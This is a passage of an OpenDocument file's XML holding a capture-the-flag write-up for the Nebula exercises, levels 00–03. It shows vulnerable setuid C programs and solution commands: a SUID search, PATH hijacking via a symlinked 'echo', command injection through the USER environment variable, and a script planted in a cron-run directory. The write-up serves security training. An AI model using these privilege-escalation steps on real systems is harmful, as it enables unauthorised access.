      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="normal" officeooo:rsid="004c296a" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" officeooo:rsid="001ff14e"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" officeooo:rsid="002e09ca"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" officeooo:rsid="002ee1d2"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" officeooo:rsid="00316d8c"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="bold" officeooo:rsid="001e58b1" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="bold" officeooo:rsid="00345002" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="bold" officeooo:rsid="0034f4f6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="bold" officeooo:rsid="00369c44" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="bold" officeooo:rsid="0038f21f" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="bold" officeooo:rsid="003ed0b1" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-weight="bold" officeooo:rsid="0042f558" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" officeooo:rsid="00345002"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" officeooo:rsid="003a2bb9"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="006b6d87" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties style:font-name="Liberation Mono1" fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00758b1b" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties officeooo:rsid="00345002"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties officeooo:rsid="00385a95"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties officeooo:rsid="003f96b1"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties officeooo:rsid="00454917"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties officeooo:rsid="00472487"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties officeooo:rsid="0047b1ac"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties officeooo:rsid="004e5d96"/>
    </style:style>
    <style:style style:name="T63" style:family="text">
      <style:text-properties officeooo:rsid="0050911b"/>
    </style:style>
    <style:style style:name="T64" style:family="text">
      <style:text-properties officeooo:rsid="0052cd59"/>
    </style:style>
    <style:style style:name="T65" style:family="text">
      <style:text-properties officeooo:rsid="0057ba38"/>
    </style:style>
    <style:style style:name="T66" style:family="text">
      <style:text-properties officeooo:rsid="005f2b6e"/>
    </style:style>
    <style:style style:name="T67" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" officeooo:rsid="006b6d87"/>
    </style:style>
    <style:style style:name="T68" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="006b6d87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0" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0080964c" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T71" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="0087c497" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T72" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0067f112" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T73" style:family="text">
      <style:text-properties officeooo:rsid="0070592f"/>
    </style:style>
    <style:style style:name="T74" style:family="text">
      <style:text-properties officeooo:rsid="007265ee"/>
    </style:style>
    <style:style style:name="T75" style:family="text">
      <style:text-properties officeooo:rsid="007270de"/>
    </style:style>
    <style:style style:name="T76" style:family="text">
      <style:text-properties fo:color="#7f0000" fo:background-color="#fbeded" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T77" style:family="text">
      <style:text-properties officeooo:rsid="00758b1b"/>
    </style:style>
    <style:style style:name="T78" style:family="text">
      <style:text-properties officeooo:rsid="007889ef"/>
    </style:style>
    <style:style style:name="T79" style:family="text">
      <style:text-properties officeooo:rsid="0078ee6c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fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T82" style:family="text">
      <style:text-properties officeooo:rsid="007e480d"/>
    </style:style>
    <style:style style:name="T83" style:family="text">
      <style:text-properties fo:color="#ff0000" officeooo:rsid="007fb249"/>
    </style:style>
    <style:style style:name="T84" style:family="text">
      <style:text-properties officeooo:rsid="0080964c"/>
    </style:style>
    <style:style style:name="T85" style:family="text">
      <style:text-properties officeooo:rsid="0083785f"/>
    </style:style>
    <style:style style:name="T86" style:family="text">
      <style:text-properties officeooo:rsid="008b45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EBULA</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://exploit-exercises.com/nebula/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T36">https://exploit-exercises.com/nebula/</text:span></text:a></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P13"><text:span text:style-name="T2">---</text:span>LEVEL00<text:span text:style-name="T2">---</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P82">TASK</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P1"><text:span text:style-name="T36">This level requires you to </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T36">find</text:span></text:span><text:span text:style-name="T36"> a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P82">Solution</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">enter the root directories</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P45">ls /</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">find all <text:span text:style-name="T1">directories which has a permission of 4000 (SUID) and write it to a new file called e.x searchflag inside a tmp directory and open the file to find a file path called ‘flag00’</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P45">find / -perm -4000 &gt; /tmp/searchflag <text:s text:c="6"/></text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P46">cat /tmp/searchflag | less</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15">flag00 is found to be in a /bin/…/flag00 . Run the file from within that directory.</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P47">./flag00</text:p>
      <text:p text:style-name="P48">getflag</text:p>
      <text:p text:style-name="P48"/>
      <text:p text:style-name="P49">---LEVEL01---</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P76">TASK</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P16">There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</text:p>
      <text:p text:style-name="P48"/>
      <text:p text:style-name="P81">level1.c</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P109"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T37">#include &lt;stdlib.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">#include &lt;unistd.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">#include &lt;string.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">#include &lt;sys/types.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">#include &lt;stdio.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">// </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">argc – contains the number of arguments passed to the program</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">// </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">argv – one dimensional array of strings. Each string is one of the arguments passed to the program.</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">// </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">envp – array of pointers to an environment variables. gives the program’s environment</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="P114"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">// For ex. The command line:</text:span></text:span></text:p>
      <text:p text:style-name="P114"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="P114"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">// gcc -o myprog myprog.c</text:span></text:span></text:p>
      <text:p text:style-name="P114"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="P114"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">// </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">argc </text:span></text:span></text:p>
      <text:p text:style-name="P114"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">//<text:tab/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">4</text:span></text:span></text:p>
      <text:p text:style-name="P114"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">//</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">argv[0]</text:span></text:span></text:p>
      <text:p text:style-name="P114"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">//<text:tab/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T41">gcc</text:span></text:span></text:p>
      <text:p text:style-name="P116">//<text:span text:style-name="T29">argv[1]</text:span></text:p>
      <text:p text:style-name="P116">//<text:tab/><text:span text:style-name="T29">-o</text:span></text:p>
      <text:p text:style-name="P116">//<text:span text:style-name="T29">argv[2]</text:span></text:p>
      <text:p text:style-name="P116">//<text:tab/><text:span text:style-name="T29">myprog</text:span></text:p>
      <text:p text:style-name="P116">//<text:span text:style-name="T29">argv[3]</text:span></text:p>
      <text:p text:style-name="P116">//<text:tab/><text:span text:style-name="T29">myprog.c</text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">int main(int argc, char **argv, char **envp)</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">{</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>gid_t gid;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>uid_t uid;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>gid = getegid();</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>uid = geteuid();</text:span></text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>setresgid(gid, gid, gid);</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>setresuid(uid, uid, uid);</text:span></text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P117">// <text:span text:style-name="T30">echo command is run using env</text:span></text:p>
      <text:p text:style-name="P117"><text:s/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>system("/usr/bin/env echo and now what?");</text:span></text:span></text:p>
      <text:p text:style-name="P130"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">}</text:span></text:span></text:p>
      <text:p text:style-name="P82">SOLUTION</text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P51">su level01</text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P51">cd</text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P17">I first need to find the location of the ‘getflag’ </text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P50">grep -rl “getflag” /* &gt; /tmp/grepy</text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P17">I find out the location to be at /bin/getflag</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P18">we can see the program is calling :</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">system("/usr/bin/env echo and now what?");</text:span></text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P19"><text:span text:style-name="T35">So now </text:span>I need to echo /bin/getflag. <text:span text:style-name="T31">First I find which path the echo command is running from</text:span></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P52">which echo </text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P20">its running from /bin/echo. <text:span text:style-name="T32">We need to change the path of the echo command.</text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"><text:span text:style-name="T32"><text:s/></text:span><text:span text:style-name="T21">PATH=/tmp:$PATH</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P23"><text:soft-page-break/>typing <text:span text:style-name="T20">which echo</text:span> again will now show the new location of the echo command</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P21">now we can create a symbolic link that echos the getflag when the program ./flag01 is executed</text:p>
      <text:p text:style-name="P24">we create a echo path in tmp directory which usually has a read and write permission.</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21"><text:span text:style-name="T20">ln -s /bin/getflag /tmp/echo </text:span>&lt;&lt; ln -s TARGET_FILE <text:s/>LINK_FILE</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P47">./<text:span text:style-name="T33">flag01 </text:span><text:span text:style-name="T4">&lt;&lt; finally execute the file from /home/flag01 directory</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P53">---LEVEL02---</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P82">TASK</text:p>
      <text:p text:style-name="P53"/>
      <text:p text:style-name="P110"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T37">#include &lt;stdlib.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">#include &lt;unistd.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">#include &lt;string.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">#include &lt;sys/types.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">#include &lt;stdio.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">int main(int argc, char **argv, char **envp)</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">{</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>char *buffer;</text:span></text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>gid_t gid;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>uid_t uid;</text:span></text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>gid = getegid(); // </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T42">get group id</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>uid = geteuid(); //</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T42">get user id</text:span></text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>setresgid(gid, gid, gid);</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>setresuid(uid, uid, uid);</text:span></text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>buffer = NULL;</text:span></text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P116"><text:s text:c="2"/>// <text:span text:style-name="T34">string is passed to the buffer. Getenv() is get an environment variable</text:span></text:p>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P115"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>asprintf(&amp;buffer, "/bin/echo %s is cool", getenv("USER"));</text:span></text:span></text:p>
      <text:p text:style-name="P115"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="P115"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>// </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T43">the buffer is then passed to the string to be printed.</text:span></text:span></text:p>
      <text:p text:style-name="P115"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>printf("about to call system(\"%s\")\n", buffer);</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/></text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"><text:s text:c="2"/>system(buffer);</text:span></text:span></text:p>
      <text:p text:style-name="P130"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">}</text:span></text:span></text:p>
      <text:p text:style-name="P82">SOLUTION</text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P51">su level02</text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P51">cd</text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P25">In the source code we can see the program is calling:</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P111"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36">system(buffer);</text:span></text:span></text:p>
      <text:p text:style-name="P111"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="P112"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T44">Notice the file has suid permission. The env. Variable USER is still set for the real UID which is level02</text:span></text:span></text:p>
      <text:p text:style-name="P111"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="P112"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T52">The buffer is</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T44"> calling getenv(“USER”). Thus we can change the value of this env variable “USER” </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T52">of our choice.</text:span></text:span></text:p>
      <text:p text:style-name="P112"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T44"/></text:span></text:p>
      <text:p text:style-name="P113"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T46">export USER=”hello there!”</text:span></text:span></text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P47">./<text:span text:style-name="T56">flag02</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P27">Since this works we can now try to execute the getflag</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P55">ln -s /bin/getflag /tmp/buffy</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P118"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T46">export USER=”;</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T47">/tmp/</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T48">buffy</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T46">”</text:span></text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P47">./<text:span text:style-name="T57">flag02</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P28">Another way is to simply:</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P119"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T46">export USER=”;</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T47">/</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T49">bin/getflag</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T46">”</text:span></text:span></text:p>
      <text:p text:style-name="P119"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T46"/></text:span></text:p>
      <text:p text:style-name="P119"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T46">./</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T49">flag02</text:span></text:span></text:p>
      <text:p text:style-name="P119"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T38"/></text:span></text:p>
      <text:p text:style-name="P120"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T53">This is because there is no command like echo that requires its to be changed to a tmp directory</text:span></text:span></text:p>
      <text:p text:style-name="P120"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T53"/></text:span></text:p>
      <text:p text:style-name="P121"/>
      <text:p text:style-name="P48"><text:span text:style-name="T2">---</text:span>LEVEL0<text:span text:style-name="T19">3---</text:span></text:p>
      <text:p text:style-name="P48"/>
      <text:p text:style-name="P82">TASK</text:p>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T36"/></text:span></text:p>
      <text:p text:style-name="P84">There is a crontab that is called every couple of minutes.</text:p>
      <text:p text:style-name="P85">Crontab is a list of commands that you want to run on a regular schedule/periodically.</text:p>
      <text:p text:style-name="P85"/>
      <text:p text:style-name="P26">for i in /home/flag03/writable.d/* ; do</text:p>
      <text:p text:style-name="P29">(ulimit -t 5; bash -x “$i”) // bash -x executes the file</text:p>
      <text:p text:style-name="P29">rm -f “$i” // removes the file in the directory</text:p>
      <text:p text:style-name="P30">done</text:p>
      <text:p text:style-name="P85"/>
      <text:p text:style-name="P86">SOLUTION</text:p>
      <text:p text:style-name="P86"/>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T45">Su level03</text:span></text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T45"/></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T50">cd</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T50"/></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T39">within the /home/flag03 directory we can see two files.</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T39">One is a directory and another is an executable script (I believe its included in crontab )</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T39"/></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T39">I tried to manipulate the sript file and I realised I have no write permission at all.</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T39"/></text:span></text:p>
      <text:p text:style-name="P31">Now the goal is to:</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P31">1). Create a script file in a /tmp directory</text:p>
      <text:p text:style-name="P31">2). execute that script file in a writable.d directory</text:p>
      <text:p text:style-name="P31">3). output and read the contents of that script file to the /tmp directory</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P31">Within a /tmp directory</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P32">flag3.sh</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P56">#!/bin/bash</text:p>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P56">/bin/getflag &gt;&gt; /tmp/gotflag.<text:span text:style-name="T58">out</text:span></text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P32">Now execute this file in a writable.d directory</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P57">cp flag3.sh /home/flag03/writable.d</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32">Wait for a while and then check back in a tmp dir for the gotflag.out file</text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P58">cat gotflag.out</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T39"/></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T50"/></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T51">---LEVEL04---</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T39"/></text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T54">TASK</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T40"/></text:span></text:p>
      <text:p text:style-name="P124"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">#include &lt;stdlib.h&gt;</text:span></text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">#include &lt;unistd.h&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">#include &lt;string.h&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">#include &lt;sys/types.h&gt;</text:span></text:p>
